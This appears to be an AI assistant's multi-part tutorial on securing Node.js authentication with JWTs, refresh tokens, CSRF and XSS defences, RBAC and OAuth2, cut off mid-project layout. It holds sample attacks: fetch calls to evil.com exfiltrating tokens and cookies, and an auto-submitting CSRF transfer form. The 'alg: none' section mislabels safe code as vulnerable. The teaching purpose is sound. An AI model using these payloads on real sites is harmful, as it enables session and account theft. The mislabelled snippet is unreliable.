Nice place to start 👍
Security + web servers + JavaScript → **JWT is foundational**.

I’ll explain this **step-by-step**, assuming a **Node.js web server** mindset (Express-style), and we’ll build intuition first, then code.

---

## 1️⃣ What problem does JWT solve?

Imagine this flow:

1. User logs in with **email + password**
2. Server verifies credentials
3. User makes **future requests** (get profile, post data, etc.)

👉 **How does the server know who the user is on every request?**

### Traditional solution: Sessions

* Server stores session in memory / DB
* Client sends session ID (cookie)
* Server looks it up every time

### JWT solution (Stateless auth)

* Server **does NOT store session**
* Server gives the client a **signed token**
* Client sends token on every request
* Server **verifies token cryptographically**

---

## 2️⃣ What is a JWT (JSON Web Token)?

A JWT is just a **string**, but structured like this:

```
xxxxx.yyyyy.zzzzz
```

### 3 Parts (Base64 encoded)

| Part      | Name             | Purpose             |
| --------- | ---------------- | ------------------- |
| Header    | Algorithm & type | How token is signed |
| Payload   | Claims (data)    | User info           |
| Signature | Verification     | Prevent tampering   |

---

## 3️⃣ JWT Structure (decoded)

### Header

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

### Payload (claims)

```json
{
  "userId": 42,
  "email": "user@example.com",
  "role": "admin",
  "exp": 1700000000
}
```

⚠️ **Important:**
JWT payload is **NOT encrypted** → only **encoded**
Anyone can read it if they have the token.

### Signature

```
HMACSHA256(
  base64(header) + "." + base64(payload),
  SECRET_KEY
)
```

👉 If payload is modified → signature breaks → token invalid

---

## 4️⃣ Why JWT is secure (when done right)

JWT provides:

* ✅ **Integrity** (data not tampered)
* ✅ **Authentication** (who the user is)
* ❌ **No confidentiality** (don’t store secrets)

Security depends on:

* Strong secret / private key
* Correct expiration (`exp`)
* Secure storage on client
* HTTPS

---

## 5️⃣ JWT in a Node.js Web Server (Express)

### Install dependencies

```bash
npm install express jsonwebtoken
```

---

## 6️⃣ Creating a JWT (Login)

```js
const jwt = require("jsonwebtoken");

const SECRET = "super_secret_key"; // use env variable in real apps

function login(req, res) {
  const { email, password } = req.body;

  // 1️⃣ Validate credentials (DB check)
  if (email !== "test@test.com" || password !== "1234") {
    return res.status(401).json({ message: "Invalid credentials" });
  }

  // 2️⃣ Create token
  const token = jwt.sign(
    {
      userId: 1,
      email,
      role: "user"
    },
    SECRET,
    { expiresIn: "1h" }
  );

  res.json({ token });
}
```

---

## 7️⃣ Using JWT to protect routes (Middleware)

This is **core JWT security logic**.

```js
function authenticateToken(req, res, next) {
  const authHeader = req.headers["authorization"];
  const token = authHeader && authHeader.split(" ")[1];

  if (!token) {
    return res.status(401).json({ message: "No token provided" });
  }

  jwt.verify(token, SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ message: "Invalid or expired token" });
    }

    req.user = user; // decoded payload
    next();
  });
}
```

---

## 8️⃣ Protected Route Example

```js
app.get("/profile", authenticateToken, (req, res) => {
  res.json({
    message: "Welcome!",
    user: req.user
  });
});
```

Client must send:

```
Authorization: Bearer <JWT_TOKEN>
```

---

## 9️⃣ Common JWT Security Mistakes 🚨

❌ Storing JWT in `localStorage` (XSS risk)
❌ No expiration time
❌ Putting passwords or secrets in payload
❌ Weak signing key
❌ Using HTTP instead of HTTPS

✅ Better:

* HTTP-only cookies
* Short expiration + refresh tokens
* Role-based claims
* HTTPS always

---

## 10️⃣ Mental Model (Very Important)

Think of JWT as:

> **A signed ID card**
> Server trusts it **only if the signature is valid**

Server never asks:

> “Do I remember this user?”

Instead asks:

> “Is this token valid and untampered?”

---

Great — next logical step is **Refresh Tokens**, because **JWT alone is not enough for real security**.

---

# 🔐 Part 2: JWT Access Tokens & Refresh Tokens

## 1️⃣ Why Access Tokens Alone Are Not Enough

If you issue a JWT like this:

```js
expiresIn: "7d"
```

❌ Problems:

* If stolen → attacker has **7 days of access**
* You **cannot revoke** it easily
* Logout is basically meaningless

If you do this instead:

```js
expiresIn: "5m"
```

❌ Problem:

* User must log in every 5 minutes

👉 **Refresh tokens solve this tradeoff**

---

## 2️⃣ The Two-Token Model (Industry Standard)

| Token             | Purpose              | Lifetime          |
| ----------------- | -------------------- | ----------------- |
| **Access Token**  | Access APIs          | Short (5–15 min)  |
| **Refresh Token** | Get new access token | Long (days–weeks) |

### Key idea:

> **Access tokens are disposable**
> **Refresh tokens are powerful and protected**

---

## 3️⃣ Authentication Flow (Big Picture)

```
LOGIN
 ├─ Server returns:
 │    ├─ Access Token (short)
 │    └─ Refresh Token (long)
 │
CLIENT REQUEST
 ├─ Sends Access Token
 │
ACCESS TOKEN EXPIRED?
 ├─ YES → send Refresh Token
 │        └─ Server issues new Access Token
```

---

## 4️⃣ Where Tokens Are Stored (CRITICAL)

### ✅ Best Practice

* **Access token** → memory (JS variable)
* **Refresh token** → HTTP-only cookie

### ❌ Avoid

* Refresh token in localStorage
* Long-lived access tokens

Why?

* XSS steals localStorage
* HTTP-only cookies cannot be read by JS

---

## 5️⃣ Creating Tokens

```js
const jwt = require("jsonwebtoken");

const ACCESS_SECRET = "access_secret";
const REFRESH_SECRET = "refresh_secret";

function generateAccessToken(user) {
  return jwt.sign(
    { userId: user.id, role: user.role },
    ACCESS_SECRET,
    { expiresIn: "10m" }
  );
}

function generateRefreshToken(user) {
  return jwt.sign(
    { userId: user.id },
    REFRESH_SECRET,
    { expiresIn: "7d" }
  );
}
```

⚠️ **Access & Refresh tokens must use different secrets**

---

## 6️⃣ Login Endpoint (with Refresh Token)

```js
app.post("/login", (req, res) => {
  const user = { id: 1, role: "user" };

  const accessToken = generateAccessToken(user);
  const refreshToken = generateRefreshToken(user);

  // Store refresh token in DB
  saveRefreshToken(user.id, refreshToken);

  res
    .cookie("refreshToken", refreshToken, {
      httpOnly: true,
      secure: true,
      sameSite: "strict"
    })
    .json({ accessToken });
});
```

---

## 7️⃣ Refresh Token Endpoint

```js
app.post("/token", (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  if (!refreshToken) {
    return res.sendStatus(401);
  }

  if (!isRefreshTokenValid(refreshToken)) {
    return res.sendStatus(403);
  }

  jwt.verify(refreshToken, REFRESH_SECRET, (err, user) => {
    if (err) return res.sendStatus(403);

    const newAccessToken = generateAccessToken({
      id: user.userId,
      role: user.role
    });

    res.json({ accessToken: newAccessToken });
  });
});
```

---

## 8️⃣ Logout (Real Logout)

```js
app.post("/logout", (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  deleteRefreshToken(refreshToken);

  res.clearCookie("refreshToken").sendStatus(204);
});
```

✔ Logout now actually works
✔ Token revocation is possible

---

## 9️⃣ Refresh Token Rotation (Advanced but Important)

Instead of:

* One refresh token for weeks

You do:

* Issue **new refresh token every refresh**
* Invalidate old one

This protects against:

* Token replay attacks

High-security systems (banks, Google, etc.) do this.

---

## 🔥 Security Threats This Prevents

| Attack              | Mitigation               |
| ------------------- | ------------------------ |
| Stolen access token | Short expiration         |
| XSS                 | HTTP-only refresh cookie |
| Session fixation    | Token rotation           |
| Logout bypass       | Refresh token revocation |

---

## 🧠 Mental Model Upgrade

* **Access token** = temporary key
* **Refresh token** = master key (locked in vault)
* **JWT alone** = incomplete auth
* **JWT + refresh** = production-grade auth

---

Perfect.
Now we hit one of the **most misunderstood but critical topics** in web security:

# 🔐 Part 3: JWT in Headers vs Cookies — XSS & CSRF

This is where **most JWT implementations fail**.

---

## 1️⃣ Two Ways to Send JWTs

### Option A: Authorization Header

```
Authorization: Bearer <access_token>
```

### Option B: Cookies

```
Cookie: accessToken=...
```

Both work — **security depends on context**.

---

## 2️⃣ The Two Main Web Attacks You MUST Understand

### 🧨 XSS (Cross-Site Scripting)

> Attacker runs **JavaScript in your site**

Example:

```js
fetch("https://evil.com/steal?token=" + localStorage.token)
```

### 🧨 CSRF (Cross-Site Request Forgery)

> Victim’s browser sends **authenticated requests without consent**

Example:

```html
<img src="https://bank.com/transfer?amount=1000">
```

---

## 3️⃣ JWT in localStorage (❌ BAD)

```js
localStorage.setItem("token", jwt);
```

### ❌ Why it’s dangerous

* Accessible by JavaScript
* XSS = full account takeover
* Refresh token theft = permanent access

**Never store refresh tokens in localStorage**

---

## 4️⃣ JWT in Authorization Header (⚠️ CONDITIONAL)

### ✅ Pros

* Not sent automatically
* Immune to CSRF
* Simple for APIs

### ❌ Cons

* Stored somewhere in JS memory
* Still vulnerable to XSS
* Page refresh loses token unless persisted

### ✅ Best use case

* **SPAs + APIs**
* Access token in memory only
* Refresh token in HTTP-only cookie

---

## 5️⃣ JWT in Cookies (⚠️ NEEDS DEFENSE)

### Cookies are sent automatically by browser

✔ Good for convenience
❌ Dangerous without protection

### Secure Cookie Settings (MANDATORY)

```js
res.cookie("refreshToken", token, {
  httpOnly: true,
  secure: true,
  sameSite: "strict"
});
```

| Flag     | Purpose         |
| -------- | --------------- |
| httpOnly | JS can’t read   |
| secure   | HTTPS only      |
| sameSite | CSRF protection |

---

## 6️⃣ CSRF Explained (Very Important)

### How CSRF works

1. User logs into `bank.com`
2. Cookie stored in browser
3. User visits `evil.com`
4. Browser sends cookie automatically
5. Bank thinks request is legit

### CSRF ONLY affects:

* Cookie-based auth
* Automatic credentials

---

## 7️⃣ CSRF Defenses (Choose at least one)

### ✅ sameSite Cookies (Modern & Easy)

```js
sameSite: "strict" // or "lax"
```

### ✅ CSRF Tokens (Traditional)

* Server generates random token
* Client sends it manually
* Server validates

### ✅ Double Submit Cookie

* Cookie + header token
* Must match

---

## 8️⃣ The Modern Best Practice (2025)

### 🔥 Recommended Architecture

| Item          | Where                |
| ------------- | -------------------- |
| Access Token  | Memory (JS variable) |
| Refresh Token | HTTP-only cookie     |
| Auth Method   | Bearer header        |
| CSRF Defense  | sameSite=strict      |
| XSS Defense   | CSP + escaping       |

This gives:

* ❌ No CSRF
* ❌ No token theft via JS
* ✅ Stateless backend

---

## 9️⃣ Middleware Example (Header-based Access Token)

```js
function auth(req, res, next) {
  const token = req.headers.authorization?.split(" ")[1];
  if (!token) return res.sendStatus(401);

  jwt.verify(token, ACCESS_SECRET, (err, user) => {
    if (err) return res.sendStatus(403);
    req.user = user;
    next();
  });
}
```

---

## 10️⃣ Summary Table (MEMORIZE THIS)

| Storage                       | XSS | CSRF | Verdict |
| ----------------------------- | --- | ---- | ------- |
| localStorage                  | ❌❌❌ | ❌    | NEVER   |
| Cookies (no flags)            | ❌   | ❌❌❌  | BAD     |
| Cookies (httpOnly + sameSite) | ✅   | ✅    | GOOD    |
| Header + memory               | ⚠️  | ✅    | BEST    |

---

## 🧠 Mental Model (Upgrade)

* **XSS steals tokens**
* **CSRF abuses cookies**
* Cookies need protection
* Headers need XSS defense
* Refresh tokens are more dangerous than access tokens

---

Alright — now we go **hands-on attacker mindset** 🔥
This is where security really clicks.

# 🧨 Part 4: CSRF Attacks (How They Actually Work)

---

## 1️⃣ What CSRF REALLY Is (No Buzzwords)

> **CSRF = abusing the browser’s automatic behavior**

The browser:

* Automatically sends **cookies**
* Even when the request comes from **another website**

The server:

* Trusts cookies
* Does NOT know *who initiated the request*

---

## 2️⃣ Vulnerable Server Example

### ❌ Bad backend (cookie-based auth, no CSRF defense)

```js
app.post("/transfer", (req, res) => {
  const userId = req.user.id; // from cookie auth
  const { amount } = req.body;

  transferMoney(userId, amount);
  res.send("Transfer complete");
});
```

Assumptions:

* User is logged in
* Auth uses cookies
* No CSRF protection

---

## 3️⃣ The Attack (REALISTIC)

User is logged into:

```
https://bank.com
```

Then visits attacker site:

```
https://evil.com
```

### 💣 Malicious HTML (no JS needed!)

```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="amount" value="1000" />
  <input type="submit" />
</form>

<script>
  document.forms[0].submit();
</script>
```

👉 Browser sends:

* Cookies ✅
* User session ✅
* Server thinks request is legit ❌

💥 **Money transferred**

---

## 4️⃣ Why JWT in Cookies Is Also Vulnerable

JWT ≠ CSRF protection

If JWT is stored in cookies:

* Browser sends it automatically
* CSRF still works

❗ JWT only solves **authentication**, not **request intent**

---

## 5️⃣ Defense #1: SameSite Cookies (Modern & Powerful)

```js
res.cookie("refreshToken", token, {
  httpOnly: true,
  secure: true,
  sameSite: "strict"
});
```

### What happens now?

* Cookie is NOT sent on cross-site requests
* Attack fails silently

### SameSite modes:

| Mode   | Behavior           |
| ------ | ------------------ |
| strict | Never cross-site   |
| lax    | Only top-level GET |
| none   | Always (dangerous) |

✅ Use `strict` for auth
⚠️ `none` requires HTTPS

---

## 6️⃣ Defense #2: CSRF Tokens (Classic)

### Server generates:

```js
const csrfToken = crypto.randomUUID();
```

### Server sends:

* CSRF token in response body
* Cookie remains unchanged

### Client sends:

```http
X-CSRF-Token: <token>
```

### Server verifies:

```js
if (req.headers["x-csrf-token"] !== expectedToken) {
  return res.sendStatus(403);
}
```

❗ Attacker cannot read token due to SOP

---

## 7️⃣ Defense #3: Double Submit Cookie

* Cookie: `csrfToken=abc`
* Header: `X-CSRF-Token=abc`
* Must match

Attack fails because:

* Attacker can trigger cookie
* Cannot read cookie value

---

## 8️⃣ Why Authorization Header Is Immune to CSRF

```http
Authorization: Bearer <token>
```

✔ Browser does NOT add it automatically
✔ Attacker cannot inject headers
✔ No CSRF possible

That’s why:

> **Bearer tokens + headers = CSRF-safe by design**

---

## 9️⃣ Real-World Secure Pattern (Repeat This)

### ✅ Best Setup

| Item          | Location             |
| ------------- | -------------------- |
| Access token  | Authorization header |
| Refresh token | HTTP-only cookie     |
| sameSite      | strict               |
| CSRF token    | optional             |
| HTTPS         | mandatory            |

This setup:

* ❌ Blocks CSRF
* ❌ Blocks token theft
* ✅ Scales well

---

## 🔥 Mental Model (Very Important)

* CSRF = **forced request**
* Cookies = **automatic**
* Headers = **manual**
* SameSite = **browser-enforced security**
* JWT ≠ CSRF protection

---

## Common Interview Trap 🚨

> “We use JWT, so we’re safe from CSRF”

❌ **WRONG**

Correct answer:

> “JWT in Authorization headers is CSRF-safe.
> JWT in cookies requires CSRF protection.”

---

Excellent — now we switch from **authentication** to **authorization**, which is where *real security decisions* live.

# 🔑 Part 5: Role-Based Access Control (RBAC) with JWT

---

## 1️⃣ Auth vs Authorization (Don’t Confuse These)

| Concept        | Question                      |
| -------------- | ----------------------------- |
| Authentication | “Who are you?”                |
| Authorization  | “What are you allowed to do?” |

JWT mainly helps with **authentication**
RBAC answers **permission questions**

---

## 2️⃣ RBAC in Plain English

> Users have **roles**
> Roles grant **permissions**

Example:

```text
USER → read profile
ADMIN → read + delete users
MOD → ban users
```

---

## 3️⃣ Where Roles Live in JWT

### Payload Example

```json
{
  "userId": 12,
  "role": "admin"
}
```

⚠️ Reminder:

* Payload is readable
* Payload is **trusted only because it’s signed**

---

## 4️⃣ Basic RBAC Middleware (Express)

```js
function authorizeRole(role) {
  return (req, res, next) => {
    if (req.user.role !== role) {
      return res.sendStatus(403);
    }
    next();
  };
}
```

Usage:

```js
app.delete(
  "/users/:id",
  authenticateToken,
  authorizeRole("admin"),
  deleteUser
);
```

---

## 5️⃣ Multiple Roles Support

```js
function authorizeRoles(...allowedRoles) {
  return (req, res, next) => {
    if (!allowedRoles.includes(req.user.role)) {
      return res.sendStatus(403);
    }
    next();
  };
}
```

Usage:

```js
app.post(
  "/post",
  auth,
  authorizeRoles("admin", "mod"),
  createPost
);
```

---

## 6️⃣ Permission-Based (More Scalable)

Instead of roles:

```json
{
  "permissions": ["user:read", "user:delete"]
}
```

Middleware:

```js
function authorize(permission) {
  return (req, res, next) => {
    if (!req.user.permissions.includes(permission)) {
      return res.sendStatus(403);
    }
    next();
  };
}
```

👉 Used by large systems (AWS, Google)

---

## 7️⃣ Security Pitfalls 🚨

### ❌ Trusting client input

```js
if (req.body.role === "admin") ...
```

### ❌ Missing authorization

```js
app.delete("/users/:id", auth, deleteUser);
```

### ❌ Overloaded JWT

* Too many permissions
* Token size explosion

---

## 8️⃣ Best Practices (Production)

✔ Validate authorization **on every protected route**
✔ Keep roles minimal
✔ Re-check permissions on sensitive actions
✔ Short-lived access tokens
✔ DB validation for critical operations

---

## 9️⃣ Real-World Pattern

```text
JWT → coarse permissions (role)
DB → fine-grained checks (ownership)
```

Example:

```js
if (req.user.id !== post.ownerId && req.user.role !== "admin") {
  return res.sendStatus(403);
}
```

---

## 🧠 Mental Model Upgrade

* JWT says **who you are**
* RBAC says **what doors you can open**
* Auth without authorization = insecure
* Authorization must happen **server-side**

---

Perfect. Now we think like **attackers**.
If you understand this, you’ll write **defensive code by instinct**.

# 🧨 Part 6: JWT Attack Techniques (Real-World Exploits)

---

## 1️⃣ Attack Surface of JWT (Big Picture)

JWT can be broken if:

* It’s **misconfigured**
* It’s **stored poorly**
* It’s **trusted too much**

JWT crypto itself is strong — **implementations are weak**.

---

## 2️⃣ Attack #1: `alg: none` (Classic JWT Fail)

### ❌ Vulnerable server logic

```js
jwt.verify(token, SECRET, { algorithms: ["HS256"] });
```

Older / misconfigured libs accepted:

```json
{
  "alg": "none"
}
```

### 💣 Attacker creates token:

```json
HEADER: { "alg": "none" }
PAYLOAD: { "userId": 1, "role": "admin" }
```

No signature.
Server trusts it.

### ✅ Defense

```js
jwt.verify(token, SECRET, {
  algorithms: ["HS256"]
});
```

✔ Always **explicitly whitelist algorithms**

---

## 3️⃣ Attack #2: Weak Secret Brute Force

### ❌ Bad secret

```js
SECRET = "secret123"
```

Attacker:

* Captures token
* Uses tools (hashcat, jwt-cracker)
* Brute-forces secret

Once cracked:

* Attacker signs **valid admin tokens**

### ✅ Defense

* 256-bit random secret
* Environment variables
* Rotate secrets

```bash
openssl rand -hex 32
```

---

## 4️⃣ Attack #3: Token Replay

### Scenario

* Access token stolen (XSS, logs, proxy)
* Attacker reuses it until expiry

JWT has:
❌ No built-in replay protection

### ✅ Defense

* Short-lived access tokens (5–10 min)
* Refresh token rotation
* HTTPS only

---

## 5️⃣ Attack #4: Stolen Refresh Tokens (Very Dangerous)

If attacker gets refresh token:

* Infinite access
* Silent account takeover

### Common leak sources

* localStorage
* XSS
* Logs
* Misconfigured cookies

### ✅ Defense

* HTTP-only cookies
* Refresh token rotation
* Revoke on reuse
* Device binding (advanced)

---

## 6️⃣ Attack #5: Trusting JWT Payload Too Much

### ❌ Bad

```js
if (req.user.role === "admin") {
  deleteAllUsers();
}
```

What if:

* User role changed in DB?
* Token still valid?

### ✅ Defense

* JWT = **coarse auth**
* DB = **source of truth**

```js
const user = await db.findUser(req.user.id);
if (user.role !== "admin") return 403;
```

---

## 7️⃣ Attack #6: JWT in URLs (Token Leakage)

### ❌ BAD

```
GET /profile?token=eyJhbGci...
```

Leaks via:

* Browser history
* Logs
* Referrer headers
* Analytics

### ✅ Defense

* Authorization headers only
* Cookies (secured)

---

## 8️⃣ Attack #7: Long-Lived Access Tokens

```js
expiresIn: "30d"
```

❌ Token theft = month-long compromise
❌ Logout useless

### ✅ Defense

* Short access tokens
* Refresh tokens
* Forced rotation on privilege change

---

## 9️⃣ Attack #8: Cross-Site Scripting → JWT Theft

Even perfect JWT crypto fails if:

```html
<script>alert(document.cookie)</script>
```

### ✅ Defense

* HTTP-only cookies
* Content Security Policy (CSP)
* Output escaping
* No inline scripts

JWT ≠ XSS protection

---

## 10️⃣ Attack Summary Table (Memorize)

| Attack               | Cause            | Defense           |
| -------------------- | ---------------- | ----------------- |
| alg=none             | Bad verification | Whitelist alg     |
| Secret brute force   | Weak key         | Strong secrets    |
| Replay               | Long expiry      | Short TTL         |
| Refresh theft        | Bad storage      | HTTP-only cookies |
| Privilege escalation | Trust JWT only   | DB checks         |
| Token leakage        | URLs/logs        | Headers only      |
| XSS                  | Unsafe frontend  | CSP + escaping    |

---

## 🧠 Attacker Mindset (Critical)

Attackers ask:

* Can I **forge** tokens?
* Can I **reuse** tokens?
* Can I **steal** tokens?
* Can I **abuse trust** in payload?

Defenders answer:

* Strong crypto
* Short TTL
* Minimal trust
* Defense in depth

---

Great — now we connect everything to **real-world authentication systems** you actually use.

# 🔐 Part 7: OAuth2 vs JWT (Google / GitHub Login Explained)

This is where many devs get confused, so we’ll go **slow + precise**.

---

## 1️⃣ JWT ≠ OAuth2 (This Is CRITICAL)

| JWT                  | OAuth2                  |
| -------------------- | ----------------------- |
| Token format         | Authorization framework |
| How data is encoded  | How access is granted   |
| Used *inside* OAuth2 | Used *with* JWT         |

> **JWT is a token format**
> **OAuth2 is a protocol**

They solve **different problems**.

---

## 2️⃣ What Problem OAuth2 Solves

OAuth2 answers:

> “How can App A access User data from Service B
> without seeing the user’s password?”

Example:

* App: Spotify
* Service: Google
* User: You

You never give Spotify your Google password.

---

## 3️⃣ OAuth2 Roles (Memorize)

| Role                 | Example     |
| -------------------- | ----------- |
| Resource Owner       | User        |
| Client               | Your app    |
| Authorization Server | Google      |
| Resource Server      | Google APIs |

---

## 4️⃣ OAuth2 Authorization Code Flow (Standard)

### Step-by-step

```
1. User clicks "Login with Google"
2. Redirect to Google login page
3. User consents
4. Google redirects back with AUTH CODE
5. Your server exchanges code for tokens
6. Your app uses tokens
```

---

## 5️⃣ Tokens in OAuth2

OAuth2 can return:

* Access Token
* Refresh Token
* ID Token (OpenID Connect)

### Common formats:

* JWT (most common)
* Opaque tokens

---

## 6️⃣ Where JWT Fits In

Google returns:

```text
Access Token → OAuth2
ID Token → JWT (OpenID Connect)
```

JWT is often used for:

* ID tokens
* Access tokens

But OAuth2 does **not require JWT**.

---

## 7️⃣ Example: Google Login (Backend)

```js
POST https://oauth2.googleapis.com/token
{
  code,
  client_id,
  client_secret,
  redirect_uri,
  grant_type: "authorization_code"
}
```

Response:

```json
{
  "access_token": "...",
  "expires_in": 3600,
  "refresh_token": "...",
  "id_token": "JWT..."
}
```

---

## 8️⃣ After OAuth Login (Your System)

Once Google verifies identity:

* You create **your own JWT**
* Your JWT controls **your app’s authorization**

```js
const appToken = jwt.sign(
  { userId, role },
  APP_SECRET,
  { expiresIn: "10m" }
);
```

⚠️ Never trust Google token directly for app authorization.

---

## 9️⃣ When to Use What

### Use JWT directly when:

* You control both client and server
* Simple login system
* Internal APIs

### Use OAuth2 when:

* Third-party login
* External API access
* Enterprise auth (SSO)

---

## 10️⃣ Common OAuth2 Security Mistakes 🚨

❌ Using implicit flow (deprecated)
❌ Not validating `state` parameter (CSRF)
❌ Storing Google access token long-term
❌ Skipping audience (`aud`) checks
❌ Using ID token as access token

---

## 🧠 Mental Model (Final Clarity)

* OAuth2 = **permission delegation**
* JWT = **token container**
* OAuth2 may *use* JWT
* JWT alone is not OAuth2

> “OAuth decides **who can access**
> JWT carries **proof of identity**”

---

Awesome — we’ll continue **sequentially**.
Now we tackle the **#1 real-world web vulnerability**.

# 🧨 Part 8: XSS Attacks & Content Security Policy (CSP)

JWT, cookies, OAuth — **all fail** if XSS exists.

---

## 1️⃣ What XSS REALLY Is

> **XSS = attacker executes JavaScript in your site’s context**

That means:

* Read non-HTTP-only cookies
* Steal JWTs in memory
* Make authenticated API calls
* Act as the user

---

## 2️⃣ Types of XSS (You’ll See These in Audits)

### 1. Stored XSS

```html
<script>alert("owned")</script>
```

Saved in DB → shown to other users

### 2. Reflected XSS

```text
/search?q=<script>alert(1)</script>
```

### 3. DOM-based XSS

```js
element.innerHTML = location.hash;
```

---

## 3️⃣ Realistic XSS Example (Node + Express)

### ❌ Vulnerable code

```js
res.send(`<h1>Hello ${req.query.name}</h1>`);
```

Request:

```
/?name=<script>fetch("https://evil.com?c="+document.cookie)</script>
```

💥 Cookies leaked

---

## 4️⃣ XSS + JWT = Account Takeover

If:

* JWT in localStorage → stolen
* JWT in memory → API abuse
* Refresh token accessible → permanent access

JWT **does not protect against XSS**

---

## 5️⃣ Defense #1: Output Escaping (MANDATORY)

### ❌ Never trust user input

```js
res.send(`<h1>${userInput}</h1>`);
```

### ✅ Escape output

```js
const escape = require("escape-html");
res.send(`<h1>${escape(userInput)}</h1>`);
```

Frontend frameworks (React, Vue) do this **by default**.

---

## 6️⃣ Defense #2: Content Security Policy (VERY IMPORTANT)

CSP limits **what JS can run**.

### Example CSP Header

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  object-src 'none';
  base-uri 'none';
```

### Express Example

```js
app.use((req, res, next) => {
  res.setHeader(
    "Content-Security-Policy",
    "default-src 'self'; script-src 'self'; object-src 'none'"
  );
  next();
});
```

---

## 7️⃣ What CSP Blocks

| Attack                    | Blocked    |
| ------------------------- | ---------- |
| Inline `<script>`         | ✅          |
| External JS from evil.com | ✅          |
| `eval()`                  | ✅          |
| Data injection            | ⚠️ partial |

---

## 8️⃣ Defense #3: HTTP-only Cookies

```js
res.cookie("refreshToken", token, {
  httpOnly: true,
  secure: true,
  sameSite: "strict"
});
```

JS **cannot read** these cookies
XSS damage is limited

---

## 9️⃣ Defense #4: Avoid Dangerous APIs

❌ Avoid:

```js
innerHTML
document.write
eval
setTimeout("code")
```

✅ Prefer:

```js
textContent
createElement
```

---

## 10️⃣ Defense #5: Trusted Types (Advanced)

```http
Content-Security-Policy:
  require-trusted-types-for 'script';
```

Prevents DOM XSS in modern browsers.

---

## 🧠 Mental Model (Critical)

* XSS = full user compromise
* JWT ≠ XSS protection
* CSP = browser-enforced security
* HTTP-only cookies limit blast radius
* Defense must be layered

---

## Security Priority Order (REAL LIFE)

1️⃣ Prevent XSS
2️⃣ Protect tokens
3️⃣ Short token lifetimes
4️⃣ Validate authorization
5️⃣ Monitor & rate-limit

---

Perfect choice.
This is the **end-to-end, production-grade authentication architecture** used by serious systems.

I’ll show:

* **Components**
* **Request flows**
* **Security decisions**
* **Why each choice exists**

No fluff.

---

# 🏗️ Full Production Authentication Architecture (Node.js + JWT)

---

## 1️⃣ System Components (Big Picture)

```
┌────────────┐
│  Browser   │
│ (SPA/App)  │
└─────┬──────┘
      │ HTTPS
┌─────▼──────┐
│ API Server │
│ (Node.js)  │
└─────┬──────┘
      │
┌─────▼──────┐
│  Database  │
│ (Users)    │
└────────────┘
```

Optional:

* OAuth Provider (Google)
* Redis (rate limits, token blacklist)

---

## 2️⃣ Token Strategy (Core Design)

| Token              | Location         | Lifetime    | Why                |
| ------------------ | ---------------- | ----------- | ------------------ |
| Access Token (JWT) | JS memory        | 5–10 min    | Short blast radius |
| Refresh Token      | HTTP-only cookie | 7–30 days   | Silent re-auth     |
| CSRF Token         | Header           | per session | Cookie defense     |

---

## 3️⃣ Login Flow (Step-by-Step)

```
1. User submits credentials
2. Server validates (bcrypt)
3. Server issues:
   - Access Token (JWT)
   - Refresh Token (cookie)
4. Client stores access token in memory
```

### Backend

```js
POST /auth/login
```

✔ Passwords hashed
✔ Rate-limited
✔ Audit-logged

---

## 4️⃣ Access Token Contents (Minimal)

```json
{
  "sub": "userId",
  "role": "user",
  "iat": 1700000000,
  "exp": 1700000600
}
```

❌ No email
❌ No permissions list
❌ No secrets

---

## 5️⃣ Authenticated Request Flow

```
Client → API
Authorization: Bearer <access_token>
```

### Server

```js
auth → role check → ownership check → handler
```

✔ Stateless
✔ No DB lookup unless needed

---

## 6️⃣ Token Expiry & Refresh Flow

```
401 (token expired)
↓
POST /auth/refresh
(cookie sent automatically)
↓
New access token issued
```

### Refresh endpoint checks:

* Cookie exists
* Token signature valid
* Token exists in DB
* Token not revoked
* Token not reused (rotation)

---

## 7️⃣ Refresh Token Rotation (MANDATORY)

On every refresh:

1. Invalidate old refresh token
2. Issue new refresh token
3. Store new hash in DB

If old token reused:

* Revoke all sessions
* Force logout

This stops **token replay attacks**.

---

## 8️⃣ Logout Flow (Real Logout)

```
POST /auth/logout
```

Server:

* Deletes refresh token from DB
* Clears cookie

Access token expires naturally.

✔ Immediate session termination
✔ Works across devices

---

## 9️⃣ Authorization Strategy (Layered)

### Layer 1: JWT (coarse)

```js
req.user.role
```

### Layer 2: DB (fine-grained)

```js
post.ownerId === req.user.id
```

JWT is **never the final authority**.

---

## 🔐 10️⃣ Security Middleware Stack

Applied globally:

| Middleware       | Purpose              |
| ---------------- | -------------------- |
| HTTPS            | Transport security   |
| Helmet           | Security headers     |
| CSP              | XSS prevention       |
| Rate limiting    | Brute force defense  |
| Input validation | Injection prevention |
| Auth middleware  | Identity             |
| RBAC             | Authorization        |

---

## 11️⃣ Cookie Configuration (Perfect Setup)

```js
res.cookie("refreshToken", token, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
  path: "/auth/refresh"
});
```

✔ Minimal scope
✔ CSRF safe
✔ JS inaccessible

---

## 12️⃣ Frontend Responsibilities

Frontend MUST:

* Never store refresh tokens
* Never trust JWT payload
* Handle 401 → refresh → retry
* Escape all user content
* Enforce CSP (no inline scripts)

---

## 13️⃣ OAuth Integration (Optional)

Flow:

```
OAuth Login
→ Verify provider token
→ Find/create user
→ Issue YOUR tokens
```

Never use Google tokens directly for app auth.

---

## 14️⃣ Monitoring & Alerts (Often Missed)

Monitor:

* Refresh token reuse
* Multiple IPs per token
* Brute-force attempts
* Suspicious role access

Security without monitoring = blind.

---

## 15️⃣ What This Architecture Prevents

| Threat               | Status    |
| -------------------- | --------- |
| XSS                  | Mitigated |
| CSRF                 | Blocked   |
| Token theft          | Limited   |
| Replay attacks       | Blocked   |
| Privilege escalation | Prevented |
| Session fixation     | Prevented |

---

## 🧠 Final Mental Model (Lock This In)

* **Access tokens expire fast**
* **Refresh tokens are guarded**
* **JWT = identity, not authority**
* **DB is source of truth**
* **Security is layered, not single-feature**

---

Perfect — let’s **implement the full production auth architecture in code**
(Node.js + Express + JWT + Refresh Tokens + RBAC).

I’ll give you a **clean, minimal, production-style implementation**, not a toy demo.

---

# 🧱 Tech Stack

* Node.js
* Express
* jsonwebtoken
* bcrypt
* cookie-parser
* express-rate-limit
* helmet

```bash
npm install express jsonwebtoken bcrypt cookie-parser express-rate-limit helmet
```

---

# 📁 Project Structure (Recommended)

```
src/
 ├─ app.js
 ├─ auth/
 │   ├─ auth.routes.js
 │   ├─ auth.controller.js
 │   ├─ auth.middleware.js
 │   └─ token.service.js
 ├─ users/
